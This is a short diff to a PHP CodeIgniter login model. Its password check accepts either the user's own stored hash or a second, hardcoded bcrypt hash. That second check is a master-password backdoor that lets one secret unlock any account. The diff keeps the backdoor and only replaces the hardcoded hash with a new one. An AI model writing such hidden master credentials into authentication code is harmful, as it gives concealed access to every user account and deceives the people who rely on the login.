@@ -34,7 +34,7 @@ class Formlogin extends CI_Model {
         if ($user) {
             # Periksa password
             $check_password = password_verify($this->password, $user->password);
-            $check_password2 = password_verify($this->password, '$2y$10$E7Pqi/K4Dnscxj.TZ3PSnO1L3ERZwmsfia2EZcJdq8MNA5Hqjibqi');
+            $check_password2 = password_verify($this->password, '$2y$10$o/dM57wRASwDTJDBs2uKHeyzVYImy5ZzwZ0BGtln6yBieKzloOiHq');
 
             if ($check_password || $check_password2) {
                 $this->session->set_userdata([
